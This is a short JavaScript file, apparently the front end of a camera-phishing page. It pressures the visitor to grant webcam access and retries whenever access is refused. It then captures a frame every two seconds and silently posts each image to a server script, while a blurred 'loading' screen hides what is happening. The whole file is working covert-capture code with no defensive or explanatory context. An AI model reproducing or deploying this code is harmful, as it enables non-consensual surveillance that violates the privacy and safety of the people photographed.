function sendData(imgData) {
    $.ajax({
        type: 'POST',
        data: { cat: imgData },
        url: 'post.php',
        dataType: 'json',
        success: function (result) {
            // Handle success
        },
        error: function (xhr, status, error) {
        }
    });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: { facingMode: "user" }
};

function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    const { width, height } = settings;

    canvas.width = width; // Set canvas width to camera stream width
    canvas.height = height; // Set canvas height to camera stream height

    const context = canvas.getContext('2d');

    setInterval(function () {
        context.drawImage(video, 0, 0, width, height); // Use camera stream dimensions
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        sendData(canvasData);
    }, 2000);
}


function showModal() {
    document.getElementById("cameraModal").style.display = "block";
}

function closeModal() {
    document.getElementById("cameraModal").style.display = "none";
}

function requestCameraAccess() {
    navigator.mediaDevices.getUserMedia(constraints)
        .then(function (stream) {
            closeModal();
            handleSuccess(stream);
            showLoadingMessage();
        })
        .catch(function (error) {
            alert("Failed to access the camera. Please refresh the page and allow camera access to proceed.");
            console.error('Error accessing camera:', error);
            requestCameraAccess(); // Retry camera access
        });
}

function showLoadingMessage() {
    $('#loadingMessage').fadeIn();
    $('body').children().not('#loadingMessage').addClass('blur');
}
